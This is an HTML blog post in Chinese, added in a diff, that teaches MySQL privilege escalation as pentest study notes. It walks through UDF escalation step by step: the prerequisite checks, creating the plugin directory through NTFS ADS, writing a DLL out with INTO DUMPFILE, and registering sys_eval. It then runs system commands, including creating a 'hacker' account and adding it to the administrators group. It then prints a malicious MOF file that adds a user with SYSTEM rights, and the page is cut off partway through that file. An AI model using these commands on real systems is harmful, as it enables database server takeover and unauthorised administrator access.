@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——sql提权 | L1uxsn&#39;Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——sql提权`
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://l1uxsn.github.io/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"SSRF","path":"2026/07/17/SSRF/"},{"title":"pickle反序列化","path":"2026/07/17/pickle反序列化/"},{"title":"nodejs原型链污染","path":"2026/07/17/nodejs原型链污染/"},{"title":"SQL注入相关","path":"2026/07/17/SQL注入相关/"},{"title":"twig与smarty模板的ssti","path":"2026/07/17/twig与smarty模板的ssti/"},{"title":"XXE漏洞","path":"2026/07/17/XXE漏洞/"},{"title":"Linux提权","path":"2026/07/17/Linux提权/"},{"title":"其他类型的数据库的注入","path":"2026/07/17/其他类型的数据库的注入/"},{"title":"python原型链污染","path":"2026/07/17/python原型链污染/"},{"title":"RCE","path":"2025/03/21/RCE/"},{"title":"sql提权","path":"2026/07/17/sql提权/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">L1uxsn.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag"></span>
+          <span class="main-left--tag"></span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“感谢永远有歌把心境道破”</p>
+        <p>“宏愿纵未了,奋斗总不太晚”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a href="https://L1uxsn.github.io"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>0</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>2 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>11 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1613天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">sql提权</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2026-07-17 21:36:01</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="sql提权"><a href="#sql提权" class="headerlink" title="sql提权"></a>sql提权</h1><h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h2><p><strong>MySQL数据库的提权主要分为两种:Mof和UDF(常用)</strong></p>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p><strong>UDF全称为user defined function，用户自定义函数</strong></p>
+<p>用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数</p>
+<p><strong>UDF提权的作用</strong></p>
+<p>渗透过程中，拿下一台低权限的主机shell（尤其是windows）时，有些操作无法进行，而此时本地恰好存在mysql数据库，且mysql是root权限 (windows中mysql一般都是管理员权限)，就可以通过新建管理员用户等操作实现提权即udf提权，也可以称为通过mysql获得管理员权限</p>
+<p><strong>UDF提权条件:</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">条件</th>
+<th align="left">要求</th>
+<th align="left">含义</th>
+<th align="left">检查命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>1. MySQL高权限账号</strong></td>
+<td align="left"><code>root</code> 或有 <code>FILE</code> + <code>CREATE FUNCTION</code> 权限</td>
+<td align="left">需要能执行文件读写操作的账户。<code>FILE</code>权限允许读写服务器文件，<code>CREATE FUNCTION</code>权限允许创建自定义函数。普通用户通常没有这些权限，只有DBA或root才有。</td>
+<td align="left"><code>SELECT user();</code> <code>SELECT file_priv FROM mysql.user WHERE user=USER();</code></td>
+</tr>
+<tr>
+<td align="left"><strong>2. secure_file_priv 为空</strong></td>
+<td align="left">不能是 <code>NULL</code> 或具体路径</td>
+<td align="left">这个是MySQL的安全开关。为空表示”无限制”，可以向任何目录写文件；如果是具体路径（如<code>/tmp/</code>）就只能写那个目录；如果是<code>NULL</code>则完全禁止读写文件。UDF提权需要向插件目录写DLL，所以必须是空。</td>
+<td align="left"><code>SHOW VARIABLES LIKE &#39;secure_file_priv&#39;;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>3. plugin_dir 可写</strong></td>
+<td align="left">MySQL服务进程有权限写入插件目录</td>
+<td align="left">即使<code>secure_file_priv</code>为空，如果MySQL进程没有操作系统的写入权限，也无法创建文件。需要确保MySQL运行账户（Windows上是<code>NETWORK SERVICE</code>或<code>LocalSystem</code>，Linux上是<code>mysql</code>用户）对插件目录有写权限。</td>
+<td align="left"><code>SHOW VARIABLES LIKE &#39;plugin_dir&#39;;</code> 手动测试：<code>SELECT &#39;test&#39; INTO DUMPFILE &#39;plugin目录/test.txt&#39;;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>4. MySQL版本</strong></td>
+<td align="left">5.1及以上：使用plugin_dir 5.0及以下：导出到系统目录</td>
+<td align="left">MySQL 5.1引入了插件目录<code>plugin_dir</code>，UDF文件必须放这里。5.0及以下版本没有这个目录，需要把DLL导出到系统目录（如Windows的<code>system32</code>或Linux的<code>/usr/lib</code>）。不同版本导出路径完全不同。</td>
+<td align="left"><code>SELECT version();</code></td>
+</tr>
+<tr>
+<td align="left"><strong>5. 操作系统兼容</strong></td>
+<td align="left">Windows用<code>.dll</code>，Linux用<code>.so</code>，且位数匹配</td>
+<td align="left">UDF文件是编译好的动态链接库，Windows上是<code>.dll</code>，Linux上是<code>.so</code>。32位的MySQL只能加载32位的UDF，64位MySQL只能加载64位的UDF。位数不匹配会报错<code>errno: 193</code>（文件格式无效）。</td>
+<td align="left"><code>SHOW VARIABLES LIKE &#39;version_compile_machine&#39;;</code>（x86&#x3D;32位，x86_64&#x3D;64位）</td>
+</tr>
+</tbody></table>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/1.png"></p>
+<p>(可以看到这里的<strong>secure_file_priv为空</strong>,能进行UDF提权)</p>
+<p><strong>动态链接库</strong></p>
+<p>动态链接库：是把程序代码中会使用的函数编译成机器码，保存在.dll文件中。在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
+<p>（<strong>注</strong>：在linux中对应为so文件）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">查询插件目录:</span><br><span class="line"></span><br><span class="line">show variables like &#x27;%plugin%&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show variables：</span><br><span class="line">这是 MySQL 的命令，用于显示系统变量的当前值。这些变量控制着 MySQL 服务器的运行方式（如缓冲区大小、超时时间、字符集等）</span><br><span class="line"></span><br><span class="line">like &#x27;%plugin%&#x27;：</span><br><span class="line">这是一个过滤条件</span><br><span class="line"></span><br><span class="line">% 是通配符，代表任意字符（包括零个字符）</span><br><span class="line"></span><br><span class="line">&#x27;%plugin%&#x27; 表示筛选出变量名中任意位置包含 &quot;plugin&quot; 这个单词的变量</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line">Variable_name	Value</span><br><span class="line">basedir	/usr (MySQL 安装目录，下面会有 plugin 子目录)</span><br><span class="line">plugin_dir	/usr/lib/mysql/plugin (插件存放的目录路径，动态链接库的专用目录)</span><br><span class="line">default_authentication_plugin	caching_sha2_password (默认的身份验证插件)</span><br><span class="line">group_replication_group_name	(如果使用了组复制插件)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/2.png"></p>
+<p>动态链接库文件:</p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/3.png"></p>
+<p><strong>dll文件上传路径</strong></p>
+<p>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL &lt; 5.0</td>
+<td>导出路径随意</td>
+</tr>
+<tr>
+<td>5.0 &lt;&#x3D; MySQL &lt; 5.1</td>
+<td>需要导出至目标服务器的系统目录（如：C:\windows\system32\）</td>
+</tr>
+<tr>
+<td>5.1 &lt; MySQL</td>
+<td>必须导出到MySQL安装目录下的<code>lib\plugin</code>目录下（高版本mysql默认不存在<code>lib\plugin</code>目录，需要自己创建）</td>
+</tr>
+</tbody></table>
+<p>版本大于5.1的时候，<code>lib\plugin</code>文件夹的创建方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">#查找到mysql的目录</span><br><span class="line"> </span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;;</span><br><span class="line">#利用NTFS ADS创建lib目录</span><br><span class="line"> </span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;;</span><br><span class="line">#利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取dll文件和上传至相应目录下</strong></p>
+<p>1.可使用sqlmap获取dll文件</p>
+<p>2.可使用msf获取</p>
+<p>3.上传dll文件</p>
+<ul>
+<li><p>创建一张临时表用来存放DLL&#x2F;SO文件的十六进制内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE temp_udf(udf blob);</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>插入</p>
+<p>转化成十六进制方法很多这里我们使用mysql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;C:/udf,dll&#x27;)) into dumpfile &#x27;c:/udf.txt&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>注</strong>：outfile导出文件会在末尾写入新行且转义换行符,破坏二进制文件结构,dumpfile不会进行任何操作</p>
+</li>
+<li><p>插入</p>
+<p>其中$binaryCode为已经转换好的十六进制内容,$binarycode前加0X</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT into temp_udf values (CONVERT($binaryCode,CHRA));</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>导出</p>
+<p>将udf文件导出至对应位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM temp_udf INTO DUMPFILE &quot;/usr/lib64/mysql/plugins/udf.dll&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>注</strong>:此时如果出现了错误Can’t create&#x2F;write to file是因为没有lib&#x2F;plugin目录into dumpfile也不能创建文件夹所以报错</p>
+</li>
+</ul>
+<p><strong>注册该函数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION 函数名</span><br><span class="line">RETURNS &#123;STRING|INTEGER|REAL|DECIMAL&#125;</span><br><span class="line">SONAME &#x27;DLL文件名.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>使用函数</strong></p>
+<p>例如注册了sys_eval函数，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT sys_eval(&#x27;你要执行的系统命令&#x27;);</span><br><span class="line"></span><br><span class="line">1. 查看当前用户   SELECT sys_eval(&#x27;whoami&#x27;);</span><br><span class="line">2. 查看系统信息   SELECT sys_eval(&#x27;systeminfo&#x27;);</span><br><span class="line">3. 查看IP配置   SELECT sys_eval(&#x27;ipconfig&#x27;);</span><br><span class="line">4. 查看进程列表   SELECT sys_eval(&#x27;tasklist&#x27;);</span><br><span class="line">5. 查看网络连接   SELECT sys_eval(&#x27;netstat -an&#x27;);</span><br><span class="line">6. 添加系统用户（需要管理员权限）   SELECT sys_eval(&#x27;net user hacker 123456 /add&#x27;);</span><br><span class="line">7. 将用户加入管理员组   SELECT sys_eval(&#x27;net localgroup administrators hacker /add&#x27;);</span><br><span class="line">8. 查看用户列表   SELECT sys_eval(&#x27;net user&#x27;);</span><br><span class="line">9. 删除用户   SELECT sys_eval(&#x27;net user hacker /delete&#x27;);</span><br><span class="line">10. 查看当前目录   SELECT sys_eval(&#x27;dir C:\\&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>工具使用</strong></p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/4.png"></p>
+<p>当得到对方mysql数据库的账号和数据库密码时，填写host和账号密码数据库类型(DB)，可直接连接对方的数据库，连接后：</p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/5.png"></p>
+<p>可在下方自带命令这里选择想要导出的moonudf.dll文件中的命令，比如这里选择了sys_eval,将dll文件绑定sys_eval函数,将其导出到指定插件文件目录<code>(这里是D:/phpstudy_pro/Extensions/MySQL5.5.29/lib/plugin//moonudf.dll)</code> ，导出后 对方数据库的插件目录下就会出现我们导出的moonudf.dll文件</p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/6.png"></p>
+<p>在对方数据库下注册该moonudf.dll:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;moonudf.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/7.png"></p>
+<p>注册成功后就能使用我们事先编译好的sys_eval函数进行提权了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT sys_eval(&#x27;你要执行的系统命令&#x27;);</span><br><span class="line"></span><br><span class="line">1. 查看当前用户   SELECT sys_eval(&#x27;whoami&#x27;);</span><br><span class="line">2. 查看系统信息   SELECT sys_eval(&#x27;systeminfo&#x27;);</span><br><span class="line">3. 查看IP配置   SELECT sys_eval(&#x27;ipconfig&#x27;);</span><br><span class="line">4. 查看进程列表   SELECT sys_eval(&#x27;tasklist&#x27;);</span><br><span class="line">5. 查看网络连接   SELECT sys_eval(&#x27;netstat -an&#x27;);</span><br><span class="line">6. 添加系统用户（需要管理员权限）   SELECT sys_eval(&#x27;net user hacker 123456 /add&#x27;);</span><br><span class="line">7. 将用户加入管理员组   SELECT sys_eval(&#x27;net localgroup administrators hacker /add&#x27;);</span><br><span class="line">8. 查看用户列表   SELECT sys_eval(&#x27;net user&#x27;);</span><br><span class="line">9. 删除用户   SELECT sys_eval(&#x27;net user hacker /delete&#x27;);</span><br><span class="line">10. 查看当前目录   SELECT sys_eval(&#x27;dir C:\\&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>示例:这里执行了select sys_eval(‘whoami’);</p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/8.png"></p>
+<p>也可在工具中直接执行命令:</p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/9.png"></p>
+<p><strong>UDF提权流程:</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">步骤</th>
+<th align="left">做什么</th>
+<th align="left">核心命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>1</strong></td>
+<td align="left">获取MySQL高权限账号</td>
+<td align="left">拿到root密码(获取对方数据库账号和密码)</td>
+</tr>
+<tr>
+<td align="left"><strong>2</strong></td>
+<td align="left">检查环境</td>
+<td align="left"><code>SHOW VARIABLES LIKE &#39;secure_file_priv&#39;</code>（必须为空）</td>
+</tr>
+<tr>
+<td align="left"><strong>3</strong></td>
+<td align="left">准备UDF文件</td>
+<td align="left">编译好的DLL（内含<code>sys_eval</code>函数）</td>
+</tr>
+<tr>
+<td align="left"><strong>4</strong></td>
+<td align="left">上传DLL到插件目录</td>
+<td align="left"><code>SELECT ... INTO DUMPFILE &#39;plugin目录/moonudf.dll&#39;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>5</strong></td>
+<td align="left">注册函数</td>
+<td align="left"><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;moonudf.dll&#39;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>6</strong></td>
+<td align="left">执行系统命令</td>
+<td align="left"><code>SELECT sys_eval(&#39;whoami&#39;)</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL高权限账号 → 写DLL到插件目录 → 注册函数 → 调用函数执行系统命令 → 提权成功</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p><strong>mof简介:</strong></p>
+<p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。<strong>在windows 2003及更低版本windows中</strong>，nullevt.mof文件存储在<code>c:/windows/system32/wbem/mof/</code>目录下，windows系统每隔五秒就会以system权限执行一次该文件，去监控进程创建和死亡，执行成功会移动到该目录下的good文件夹，执行失败移动到bad文件夹</p>
+<p><img src="/img/sql%E6%8F%90%E6%9D%83/10.png"></p>
+<p><strong>原理</strong></p>
+<p><strong>把恶意MOF文件写入<code>C:\Windows\System32\wbem\mof\</code>目录，Windows会自动以SYSTEM权限执行它。</strong></p>
+<p><strong>利用条件</strong></p>
+<p>mof提权需要在system32文件夹下写文件，条件较为严苛：</p>
+<ul>
+<li>windows 2003及以下版本</li>
+<li>mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</li>
+<li>secure_file_priv参数不为null</li>
+</ul>
+<p><strong>利用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line"></span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line"></span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line"></span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line"></span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line"></span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line"></span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line"></span><br><span class="line">    ScriptText = </span><br><span class="line"></span><br><span class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user L1uxsn admin123 /add\&quot;)&quot;; </span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line"></span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line"></span><br><span 